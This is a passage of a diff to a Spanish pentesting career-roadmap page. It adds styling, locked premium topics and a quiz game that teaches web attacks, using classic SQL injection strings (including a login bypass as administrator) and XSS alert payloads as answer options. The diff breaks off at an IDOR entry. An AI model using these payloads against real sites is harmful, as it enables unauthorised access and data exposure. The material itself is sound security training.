@@ -4,7 +4,6 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <style>[hidden]{display:none!important}img{max-width:100%}:root{color-scheme:light}</style>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
 <title>Mapa de Carrera</title>
 <style>
   /* Layout: gamified career ladder — XP header, locked tiers, labs + proof per item */
@@ -128,9 +127,157 @@
   .premium.locked .p-lock{display:flex}
   .p-lock-card{background:var(--surface);border:1px solid var(--gold);border-radius:16px;box-shadow:var(--shadow);padding:1.2rem;text-align:center;max-width:320px}
   .p-body{display:flex;flex-direction:column;gap:.8rem}
-</style>
-</head>
-<body>
+  .gbtn{font-family:var(--mono);font-size:.72rem;border:1px solid var(--gold);border-radius:99px;padding:.22rem .55rem;cursor:pointer;background:var(--gold-soft);color:var(--gold);display:inline-flex;align-items:center;gap:.25rem}
+  .adv{margin:.1rem .35rem .4rem;border-top:1px dashed var(--gold);padding-top:.35rem;position:relative}
+  .adv-head{font-family:var(--mono);font-size:.66rem;color:var(--gold);text-transform:uppercase;letter-spacing:.08em;padding:.15rem .5rem}
+  .adv.locked .adv-body{filter:blur(2.5px) grayscale(.4);opacity:.5;pointer-events:none;max-height:120px;overflow:hidden}
+  .adv .adv-body ul{padding-top:0}
+  .g-diff{display:flex;flex-direction:column;gap:.5rem;margin:.3rem 0}
+  .g-diff button{text-align:left;font-family:var(--sans);border:1px solid var(--border);background:var(--surface-2);color:var(--fg);border-radius:12px;padding:.7rem .8rem;cursor:pointer}
+  .g-diff button b{font-family:var(--display)}
+  .g-diff button small{display:block;color:var(--muted);font-size:.78rem;margin-top:.1rem}
+  .g-top{display:flex;justify-content:space-between;align-items:center;font-family:var(--mono);font-size:.78rem;color:var(--muted)}
+  .g-timer{color:var(--accent);font-weight:600}
+  .g-do{font-size:1rem;margin:.5rem 0}
+  .g-help{background:var(--surface-2);border:1px solid var(--border);border-radius:10px;padding:.55rem .7rem;font-size:.84rem;color:var(--muted);margin:.4rem 0}
+  .g-help code{font-family:var(--mono);color:var(--fg);word-break:break-all}
+  .g-in{font-family:var(--mono);font-size:.9rem;color:var(--fg);background:var(--surface-2);border:1px solid var(--border);border-radius:9px;padding:.6rem .7rem;width:100%}
+  .g-fb{font-size:.84rem;min-height:1.2em;margin:.3rem 0}
+  .g-done{text-align:center;padding:1rem 0}
+  .g-done .big{font-size:2.4rem}
+
+  /* ---- Juego arcade: GAME HackerXd (synthwave) ---- */
+  #gameCard.lg{max-width:470px}
+  .g-wrap{position:relative;border-radius:16px;overflow:hidden;padding:1.1rem .9rem 1rem;color:#f2e9ff;border:1px solid #6a2a8e}
+  .g-wrap.bg-synth{background:radial-gradient(130% 110% at 50% 118%,#ff2d95 0%,#a81fd0 24%,#5a1b86 46%,#2a0d53 68%,#0b0820 100%)}
+  .g-wrap.bg-matrix{background:radial-gradient(120% 100% at 50% 0%,#0a5a30,#042616 55%,#010a05 100%);border-color:#1f9d57}
+  .g-wrap.bg-neon{background:radial-gradient(120% 100% at 50% -10%,#0b3d8a,#2a1b6e 45%,#0a0a22 92%);border-color:#2f6ad0}
+  .g-wrap.bg-void{background:radial-gradient(120% 100% at 50% 18%,#2a1148,#120a28 68%,#050208);border-color:#4a2a7e}
+  .g-scan{position:absolute;inset:0;pointer-events:none;z-index:2;opacity:.45;background:repeating-linear-gradient(0deg,rgba(0,0,0,.2) 0 1px,transparent 1px 3px)}
+  .g-grid-bg{position:absolute;inset:0;pointer-events:none;z-index:0;opacity:.4;
+    background-image:linear-gradient(rgba(255,90,210,.25) 1px,transparent 1px),linear-gradient(90deg,rgba(120,200,255,.18) 1px,transparent 1px);
+    background-size:28px 28px;transform:perspective(220px) rotateX(58deg);transform-origin:bottom;mask-image:linear-gradient(180deg,transparent 40%,#000 100%)}
+  .g-wrap>*{position:relative;z-index:3}
+  .g-coin{font-family:var(--mono);font-size:.72rem;letter-spacing:.3em;color:#ffe04a;text-align:center;text-shadow:0 0 8px #ff9f20aa;animation:gFlash 1.1s steps(2) infinite}
+  .g-neon{font-family:var(--display);font-weight:800;letter-spacing:.03em;line-height:.9;text-align:center;margin:.1rem 0}
+  .g-neon .a{font-size:2.1rem;display:block;color:#b8f6ff;text-shadow:0 0 6px #38e6ff,0 0 16px #0bb0ff,0 0 2px #fff}
+  .g-neon .b{font-size:2.5rem;display:block;color:#ffd0f0;text-shadow:0 0 7px #ff4dd2,0 0 18px #c912a6,0 0 2px #fff;animation:gGlitch 3.2s infinite}
+  .g-tag{text-align:center;font-family:var(--mono);font-size:.74rem;color:#e3b8ff;margin:.15rem 0 .2rem}
+  .g-char-row{display:flex;align-items:center;justify-content:center;gap:.7rem;margin:.5rem 0 .2rem}
+  .g-ava{filter:drop-shadow(0 3px 5px rgba(0,0,0,.55));image-rendering:pixelated}
+  .g-ava.float{animation:gBob 1.9s ease-in-out infinite}
+  .g-ava.spin{animation:gSpin 2.6s linear infinite}
+  .g-ava.pulse{animation:gPulseGlow 1.5s ease-in-out infinite}
+  .g-name{font-family:var(--mono);font-size:.78rem;color:#ffd0f0;border:1px solid #a53b8e;background:#2a0d3e;border-radius:8px;padding:.2rem .5rem}
+  .g-say{max-width:95%;margin:.5rem auto 0;background:#1b0f33cc;border:1px solid #7a3ba5;border-radius:12px;padding:.55rem .75rem;font-size:.9rem;color:#f2e9ff;position:relative}
+  .g-say:before{content:"";position:absolute;top:-8px;left:26px;border:7px solid transparent;border-bottom-color:#7a3ba5}
+  .g-say b.name{color:#5ef0c0;font-family:var(--display)}
+  .g-screen{margin:.7rem auto 0;max-width:300px;background:#120a28;border:2px solid #7a3ba5;border-radius:10px;padding:.7rem;box-shadow:0 0 0 3px #2a0d3e,0 10px 24px rgba(0,0,0,.5);position:relative}
+  .g-screen:after{content:"";position:absolute;inset:0;border-radius:8px;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,0,0,.14) 0 1px,transparent 1px 3px)}
+  .g-pscene{font-size:2.6rem;text-align:center;line-height:1.15;margin:.2rem 0 .3rem;min-height:2.6rem}
+  .g-pscene .pop{display:inline-block;animation:gPop .4s ease-out}
+  /* frasco */
+  .jar{position:relative;width:92px;height:140px;margin:.2rem auto .1rem;border:3px solid #ffd0f0;border-top:none;border-radius:6px 6px 26px 26px;background:linear-gradient(90deg,rgba(255,255,255,.06),rgba(255,255,255,.14),rgba(255,255,255,.04));overflow:hidden}
+  .jar:before{content:"";position:absolute;left:-7px;right:-7px;top:-9px;height:9px;border:3px solid #ffd0f0;border-radius:6px;background:#120a28}
+  .jar .water{position:absolute;left:0;right:0;bottom:0;height:10px;background:linear-gradient(180deg,#3fb6ff,#1773d6);border-top:2px solid #9fe0ff;transition:height 1.6s cubic-bezier(.3,.7,.3,1);opacity:.85}
+  .jar .ball{position:absolute;left:50%;bottom:6px;width:26px;height:26px;margin-left:-13px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#ffe08a,#e8922a);box-shadow:inset -3px -3px 0 #b86a18;transition:bottom 1.6s cubic-bezier(.3,.7,.3,1);z-index:2}
+  .jar.solved .water{height:118px}.jar.solved .ball{bottom:112px}
+  .g-acts{display:flex;flex-direction:column;gap:.5rem;margin:.6rem 0 .1rem}
+  .g-act{display:flex;align-items:center;gap:.55rem;text-align:left;font-family:var(--sans);font-size:.9rem;color:#f2e9ff;background:#1b0f33;border:1px solid #7a3ba5;border-radius:11px;padding:.6rem .7rem;cursor:pointer;transition:border-color .15s,background .15s}
+  .g-act:hover{border-color:#5ef0c0}
+  .g-act.bad{border-color:#ff5a7a;background:rgba(255,90,122,.16);animation:gShake .35s}
+  .g-act.ok{border-color:#2ec27e;background:rgba(46,194,126,.2)}
+  .g-act[disabled]{opacity:.55;cursor:default}
+  /* reto de código */
+  .g-top{display:flex;justify-content:space-between;align-items:center;font-family:var(--mono);font-size:.76rem;color:#e0b0ff;margin-bottom:.1rem}
+  .g-bubble{max-width:98%;margin:.5rem auto 0;background:#1b0f33cc;border:1px solid #7a3ba5;border-radius:12px;padding:.55rem .75rem;font-size:.9rem;color:#f2e9ff;position:relative}
+  .g-bubble b.name{color:#5ef0c0;font-family:var(--display)}
+  .g-opts{display:flex;flex-direction:column;gap:.5rem;margin:.55rem 0 .1rem}
+  .g-opt{display:flex;align-items:center;gap:.55rem;text-align:left;font-family:var(--mono);font-size:.88rem;color:#f2e9ff;background:#150b2b;border:1px solid #7a3ba5;border-radius:10px;padding:.6rem .7rem;cursor:pointer;width:100%;transition:border-color .15s,background .15s}
+  .g-opt:hover{border-color:#5ef0c0}
+  .g-opt .k{flex:none;width:22px;height:22px;border-radius:6px;display:flex;align-items:center;justify-content:center;background:#120a28;border:1px solid #7a3ba5;font:700 .8rem var(--display,sans-serif);color:#e0b0ff}
+  .g-opt .code{word-break:break-all}
+  .g-opt.glow{border-color:#2ec27e;box-shadow:0 0 0 2px rgba(46,194,126,.32);animation:gGlow 1.4s ease-in-out infinite}
+  .g-opt.ok{border-color:#2ec27e;background:rgba(46,194,126,.18)}
+  .g-opt.bad{border-color:#ff5a7a;background:rgba(255,90,122,.16);animation:gShake .35s}
+  .g-opt[disabled]{cursor:default}
+  .g-explain{margin:.5rem 0 .1rem;background:#1b0f33cc;border:1px solid #7a3ba5;border-left:3px solid #5ef0c0;border-radius:10px;padding:.55rem .7rem;font-size:.86rem;color:#f2e9ff}
+  .g-type{font-family:var(--mono);font-size:.92rem;background:#06140c;color:#5ef08a;border:1px solid #14432a;border-radius:8px;padding:.55rem .65rem;margin-top:.45rem;word-break:break-all;white-space:pre-wrap;min-height:1.4em}
+  .g-caret{display:inline-block;width:8px;margin-left:1px;color:#5ef08a;animation:gCaret .9s steps(1) infinite}
+  .g-fb{font-size:.84rem;min-height:1.1em;margin:.25rem 0;color:#ffb3c6}
+  .g-reward{margin:.55rem 0 .1rem;background:linear-gradient(90deg,rgba(255,207,63,.16),rgba(255,45,149,.16));border:1px solid #ffcf3f;border-radius:10px;padding:.5rem .7rem;font-size:.86rem;color:#ffe9a8;text-align:center;animation:gPop .4s}
+  .g-start{display:block;margin:.8rem auto .2rem;font-family:var(--display);font-weight:800;font-size:1.05rem;letter-spacing:.04em;color:#2a0640;background:linear-gradient(180deg,#ff8fd6,#ff2d95);border:none;border-radius:12px;padding:.65rem 1.4rem;cursor:pointer;box-shadow:0 0 0 3px #5a0f3a,0 8px 18px rgba(255,45,149,.35);animation:gPulse 1.6s ease-in-out infinite}
+  .g-link{display:block;margin:.1rem auto 0;background:transparent;border:none;color:#d9b3ff;font-size:.8rem;text-decoration:underline;cursor:pointer}
+  .g-mini{display:block;margin:.5rem auto 0;background:transparent;border:1px solid #7a3ba5;color:#e9d6ff;border-radius:9px;font-size:.82rem;padding:.4rem .7rem;cursor:pointer}
+  .g-skipbar{display:flex;justify-content:flex-end;margin-top:.5rem}
+  .g-skip{font-size:.74rem;background:transparent;border:1px solid #7a3ba5;color:#e0b0ff;border-radius:8px;padding:.25rem .55rem;cursor:pointer}
+  .g-row{display:flex;gap:.5rem;margin-top:.7rem}
+  .g-next{flex:1;font-family:var(--display);font-weight:700;color:#2a0640;background:linear-gradient(180deg,#8fffd0,#1fd18a);border:none;border-radius:11px;padding:.6rem;cursor:pointer}
+  .g-ghost{font-family:var(--sans);color:#f2e9ff;background:#1b0f33;border:1px solid #7a3ba5;border-radius:11px;padding:.6rem .8rem;cursor:pointer}
+  /* armario */
+  .wr-cat{margin:.5rem 0}
+  .wr-cat h4{font:700 .72rem/1 var(--mono);color:#e0b0ff;letter-spacing:.14em;margin:.35rem 0;text-transform:uppercase}
+  .wr-items{display:flex;flex-wrap:wrap;gap:.4rem}
+  .wr-it{font-size:.8rem;border:1px solid #7a3ba5;background:#1b0f33;color:#f2e9ff;border-radius:9px;padding:.4rem .55rem;cursor:pointer}
+  .wr-it.on{border-color:#5ef0c0;background:#123a2a;color:#9ff0d0}
+  .wr-it.lock{opacity:.4;cursor:default}
+  .wr-count{text-align:center;font-family:var(--mono);font-size:.74rem;color:#e0b0ff;margin:.2rem 0}
+  @keyframes gFlash{0%{opacity:1}50%{opacity:.25}100%{opacity:1}}
+  @keyframes gBob{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+  @keyframes gSpin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+  @keyframes gPulseGlow{0%,100%{filter:drop-shadow(0 0 2px #36e6ff)}50%{filter:drop-shadow(0 0 11px #36e6ff)}}
+  @keyframes gPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
+  @keyframes gGlow{0%,100%{box-shadow:0 0 0 2px rgba(46,194,126,.2)}50%{box-shadow:0 0 0 4px rgba(46,194,126,.5)}}
+  @keyframes gShake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
+  @keyframes gCaret{0%,49%{opacity:1}50%,100%{opacity:0}}
+  @keyframes gPop{0%{transform:scale(.5);opacity:0}100%{transform:scale(1);opacity:1}}
+  @keyframes gGlitch{0%,88%,100%{text-shadow:0 0 7px #ff4dd2,0 0 18px #c912a6,0 0 2px #fff}90%{text-shadow:2px 0 7px #4dffd2,-2px 0 18px #12c9ff,0 0 2px #fff}94%{text-shadow:-2px 0 7px #ff4d8a,2px 0 12px #4dd2ff,0 0 2px #fff}}
+  @media (prefers-reduced-motion:reduce){.g-ava,.g-coin,.g-neon .b,.g-start,.g-opt.glow{animation:none!important}.jar .water,.jar .ball{transition:none!important}}
+  /* ---- cinemática atacante / víctima ---- */
+  .hk-tags{display:flex;justify-content:space-between;font:600 .68rem var(--mono);color:#e0b0ff;margin:.3rem 0 .2rem}
+  .hk-win{border-radius:9px;overflow:hidden;border:1px solid #33406e;margin:.4rem 0;box-shadow:0 6px 16px rgba(0,0,0,.4)}
+  .hk-bar{display:flex;align-items:center;gap:.5rem;padding:.3rem .55rem;font:600 .7rem var(--mono);color:#cfe0ff;background:#0f1830;border-bottom:1px solid #33406e}
+  .hk-dot{position:relative;width:9px;height:9px;border-radius:50%;background:#ff5f56;box-shadow:15px 0 0 #ffbd2e,30px 0 0 #27c93f;margin-right:34px}
+  .hk-term{font-family:var(--mono);font-size:.76rem;line-height:1.5;color:#8ef0a8;background:#04110a;padding:.5rem .6rem;min-height:84px;white-space:pre-wrap;word-break:break-all}
+  .hk-term .pr{color:#5ad1ff}
+  .hk-term .ot{color:#cdd9ee;opacity:.85}
+  .hk-term .cc{display:inline-block;width:7px;height:1em;vertical-align:-2px;background:#8ef0a8;animation:gCaret .9s steps(1) infinite}
+  .hk-brow{background:#f4f6fb}
+  .hk-url{display:flex;align-items:center;gap:.4rem;font:600 .68rem var(--mono);color:#2a3550;background:#dfe5f2;padding:.3rem .55rem;border-bottom:1px solid #c4ccdd;word-break:break-all}
+  .hk-page{padding:.55rem .65rem;font-size:.8rem;color:#1b2234;background:#fff;min-height:64px}
+  .hk-page b{color:#0b1020}
+  .hk-page .pr{color:#3a4258}
+  .hk-page .muted{color:#8a93a8;font-size:.74rem}
+  .hk-page .ok{color:#10833f;font-weight:700;margin-top:.25rem}
+  .hk-page mark{background:#ffe58a;color:#4a3a00;border-radius:3px;padding:0 3px}
+  .hk-page .danger{color:#b11030;font-weight:700;margin-top:.25rem}
+  .hk-page .term2{font-family:var(--mono);font-size:.73rem;background:#0b1020;color:#7CFC98;border-radius:5px;padding:.35rem .45rem;margin-top:.2rem;white-space:pre-wrap;word-break:break-all}
+  .hk-alert{margin-top:.35rem;border:1px solid #b9c2d6;border-radius:6px;box-shadow:0 4px 12px rgba(0,0,0,.18);overflow:hidden;animation:gPop .25s}
+  .hk-alert .h{background:#eef1f8;font:600 .72rem var(--sans);color:#333;padding:.3rem .5rem;border-bottom:1px solid #d6dbe8}
+  .hk-alert .b{padding:.45rem .5rem;font-size:.82rem;color:#111}
+  .hk-alert .ab{display:inline-block;margin-top:.35rem;background:#2b6cf0;color:#fff;border-radius:5px;font-size:.74rem;padding:.2rem .7rem}
+  /* ---- premium / animaciones exclusivas ---- */
+  .g-ava.glitch{animation:gAvaGlitch .45s steps(2) infinite}
+  .g-ava.rainbow{animation:gRainbow 2.2s linear infinite}
+  .wr-it.prem{border-color:#ffcf3f;color:#ffe9a8}
+  .wr-it.prem.on{background:#3a2e0c}
+  @keyframes gAvaGlitch{0%{transform:translate(0,0)}25%{transform:translate(-1px,1px)}50%{transform:translate(1px,-1px);filter:hue-rotate(45deg)}75%{transform:translate(-1px,0)}100%{transform:translate(0,0)}}
+  @keyframes gRainbow{from{filter:hue-rotate(0)}to{filter:hue-rotate(360deg)}}
+  /* ---- Tetris de código / ordenar piezas ---- */
+  .ord-target{min-height:34px;border:1px dashed #7a3ba5;border-radius:8px;padding:.5rem .55rem;margin-bottom:.55rem;font-family:var(--mono);font-size:.92rem;color:#9ff0c2;word-break:break-all}
+  .ord-pieces{display:flex;flex-wrap:wrap;gap:.45rem}
+  .ord-pz{font-family:var(--mono);font-size:.86rem;background:#150b2b;border:1px solid #7a3ba5;border-radius:8px;padding:.5rem .65rem;color:#f2e9ff;cursor:pointer}
+  .ord-pz:hover{border-color:#5ef0c0}
+  .ord-pz:disabled{opacity:.4;cursor:default}
+  .ord-pz.bad{border-color:#ff5a7a;animation:gShake .35s}
+  .ord-pz.ok{border-color:#2ec27e;background:rgba(46,194,126,.18)}
+  /* ---- consola escribible (difícil) ---- */
+  .hk-input{width:100%;box-sizing:border-box;font-family:var(--mono);font-size:.85rem;color:#8ef0a8;background:#04110a;border:1px solid #7a3ba5;border-radius:8px;padding:.5rem .6rem;margin-top:.5rem}
+  .hk-input:focus{outline:none;border-color:#5ef0c0}
+  .hk-input.bad{border-color:#ff5a7a;animation:gShake .35s}
+  .hk-input:disabled{opacity:.5}
+  </style>
+
 <div class="wrap">
   <header>
     <div class="rank-row">
@@ -167,31 +314,39 @@
         <section data-sec>
           <div class="s-head"><span class="ico">🕸️</span><h3>Amplitud web (OWASP Top 10)</h3><span class="s-count"></span><span class="chev">▼</span></div>
           <ul>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">XSS</span><small>reflejado, almacenado y DOM</small></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">🧪 Lab</a></div></li>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Control de acceso / IDOR</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control">🧪 Lab</a></div></li>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Autenticación</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication">🧪 Lab</a></div></li>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">SSRF</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">🧪 Lab</a></div></li>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">CSRF</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">🧪 Lab</a></div></li>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">File upload &amp; path traversal</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-upload">🧪 Lab</a></div></li>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Command injection</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/os-command-injection">🧪 Lab</a></div></li>
-            <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">XXE</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">🧪 Lab</a></div></li>
+            <li class="item" data-game="xss-basico"><label><input type="checkbox"><span class="txt"><span class="lead">XSS</span><small>reflejado, almacenado y DOM</small></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">🧪 Lab</a></div></li>
+            <li class="item" data-game="idor"><label><input type="checkbox"><span class="txt"><span class="lead">Control de acceso / IDOR</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control">🧪 Lab</a></div></li>
+            <li class="item" data-game="autenticacion"><label><input type="checkbox"><span class="txt"><span class="lead">Autenticación</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication">🧪 Lab</a></div></li>
+            <li class="item" data-game="ssrf"><label><input type="checkbox"><span class="txt"><span class="lead">SSRF</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">🧪 Lab</a></div></li>
+            <li class="item" data-game="csrf"><label><input type="checkbox"><span class="txt"><span class="lead">CSRF</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">🧪 Lab</a></div></li>
+            <li class="item" data-game="path-traversal"><label><input type="checkbox"><span class="txt"><span class="lead">File upload &amp; path traversal</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-upload">🧪 Lab</a></div></li>
+            <li class="item" data-game="cmd-injection"><label><input type="checkbox"><span class="txt"><span class="lead">Command injection</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/os-command-injection">🧪 Lab</a></div></li>
+            <li class="item" data-game="xxe"><label><input type="checkbox"><span class="txt"><span class="lead">XXE</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">🧪 Lab</a></div></li>
           </ul>
+          <div class="adv locked" data-adv>
+            <div class="adv-head">🔒 Avance · Premium</div>
+            <div class="adv-body"><ul>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">HTTP request smuggling</span></span></label></li>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">Prototype pollution</span></span></label></li>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">Web LLM attacks</span></span></label></li>
+            </ul></div>
+          </div>
         </section>
 
         <section data-sec>
           <div class="s-head"><span class="ico">💉</span><h3>SQL Injection · 18 labs</h3><span class="s-count"></span><span class="chev">▼</span></div>
           <ul>
-            <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">WHERE clause — datos ocultos</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">🧪 Lab</a></div></li>
+            <li class="item" data-game="sqli-basico"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">WHERE clause — datos ocultos</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">🧪 Lab</a></div></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Login bypass</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Versión BD — Oracle</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Versión BD — MySQL/Microsoft</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Listar contenido — no-Oracle</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Listar contenido — Oracle</span></span></label></li>
-            <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">UNION — número de columnas</span></span></label></li>
+            <li class="item" data-game="sqli-union"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">UNION — número de columnas</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">UNION — columna con texto</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">UNION — datos de otras tablas</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">UNION — varios valores en 1 columna</span></span></label></li>
-            <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Blind — respuestas condicionales</span></span></label></li>
+            <li class="item" data-game="sqli-blind"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Blind — respuestas condicionales</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Blind — errores condicionales</span></span></label></li>
             <li class="item"><label><input type="checkbox" data-default="done"><span class="txt"><span class="lead">Visible error-based</span></span></label></li>
             <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Blind — time delays</span></span></label></li>
@@ -200,6 +355,14 @@
             <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Blind — out-of-band (exfiltración)</span><small>⚠️ Burp Pro</small></span></label></li>
             <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Filter bypass vía XML encoding</span></span></label></li>
           </ul>
+          <div class="adv locked" data-adv>
+            <div class="adv-head">🔒 Avance · Premium</div>
+            <div class="adv-body"><ul>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">Second-order SQLi</span></span></label></li>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">NoSQL injection</span></span></label></li>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">Bypass de WAF avanzado</span></span></label></li>
+            </ul></div>
+          </div>
         </section>
 
         <section data-sec>
@@ -209,6 +372,14 @@
             <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Firewalls y segmentación</span></span></label></li>
             <li class="item"><label><input type="checkbox"><span class="txt"><span class="lead">Active Directory básico</span></span></label><div class="meta"><a class="lab" target="_blank" rel="noopener" href="https://tryhackme.com/module/hacking-active-directory">🧪 Lab</a></div></li>
           </ul>
+          <div class="adv locked" data-adv>
+            <div class="adv-head">🔒 Avance · Premium</div>
+            <div class="adv-body"><ul>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">Pivoting y túneles</span></span></label></li>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">Análisis con Wireshark</span></span></label></li>
+              <li class="item"><label><input type="checkbox" disabled><span class="txt"><span class="lead">Evasión de IDS/IPS</span></span></label></li>
+            </ul></div>
+          </div>
         </section>
 
         <section data-sec>
@@ -412,9 +583,14 @@
         </div>
       </div>
     </div>
+
+    <div class="overlay" id="gameOverlay" hidden>
+      <div class="card lg" id="gameCard"></div>
+    </div>
   </main>
 </div>
 
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
 
 <script>
 (function(){
@@ -443,6 +619,11 @@
     // meta row (create if missing)
     var meta=it.querySelector('.meta');
     if(!meta){ meta=document.createElement('div'); meta.className='meta'; it.appendChild(meta); }
+    if(it.dataset.game){
+      var gbtn=document.createElement('button'); gbtn.type='button'; gbtn.className='gbtn'; gbtn.textContent='🎮 Game';
+      gbtn.addEventListener('click',function(e){ e.preventDefault(); openGame(it.dataset.game); });
+      meta.appendChild(gbtn);
+    }
     var pbtn=document.createElement('button'); pbtn.type='button'; pbtn.className='proofBtn'; pbtn.textContent='🔗 prueba';
     meta.appendChild(pbtn);
     var pin=document.createElement('input'); pin.type='url'; pin.className='proof'; pin.placeholder='Pega el enlace de tu prueba (writeup, lab resuelto...)';
@@ -593,13 +774,751 @@
     try{ if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(ta.value).then(ok).catch(function(){try{document.execCommand('copy');ok();}catch(e){}}); } else { document.execCommand('copy'); ok(); } }catch(e){ try{document.execCommand('copy');ok();}catch(e2){} }
   });
 
+  // ---- Juego arcade: GAME HackerXd (v3: puzzles + recompensas) ----
+  var GAMES={
+    'sqli-basico':{t:'SQL Injection — datos ocultos',pasos:[
+      {q:'La web filtra productos por categoría ("Gifts") y hay productos ocultos. ¿Qué pones para cerrar la comilla y comentar el resto de la consulta?',
+       o:["Gifts'--","Gifts\";--","Gifts OR hidden=0"],c:0,
+       e:'La comilla simple cierra el texto \'Gifts\' y los dos guiones -- comentan lo que viene después (el AND released = 1). Se ven los productos ocultos.'},
+      {q:'Ahora quieres sacar TODAS las categorías con una condición que siempre sea verdadera. ¿Cuál usas?',
+       o:["Gifts' AND 1=2--","Gifts' OR 1=1--","Gifts' ORDER BY 1--"],c:1,
+       e:'OR 1=1 es verdadero para TODAS las filas, así que la base de datos devuelve el catálogo entero, no solo "Gifts".'},
+      {q:'En el login quieres entrar como administrador sin su contraseña. ¿Qué escribes en el campo USUARIO?',
+       o:["administrator' OR '1","administrator\"#","administrator'--"],c:2,
+       e:'Pones administrator, cierras con comilla y comentas con -- la comprobación de la contraseña. Entras sin saber la clave.'}
+    ]},
+    'xss-basico':{t:'XSS — prueba de concepto',pasos:[
+      {q:'Quieres demostrar que se ejecuta tu JavaScript con un aviso que muestre el número 1. ¿Cuál es el payload clásico?',
+       o:['<script>alert(1)<\/script>','<alert>1</alert>','{{alert(1)}}'],c:0,
+       e:'La etiqueta <script> hace que el navegador ejecute lo de dentro. alert(1) abre un aviso: la prueba de que se ejecuta tu JavaScript.'},
+      {q:'Han bloqueado la etiqueta <script>. ¿Cómo lanzas el alert usando una imagen que falla a propósito?',
+       o:['<img onclick=alert(1)>','<img src=x onerror=alert(1)>','<svg>alert(1)</svg>'],c:1,
+       e:'src=x no existe: falla al cargar y se dispara onerror, que ejecuta alert(1). Salta solo, sin clic.'}
+    ]},
+    'idor':{t:'IDOR — acceso a datos de otro',pasos:[
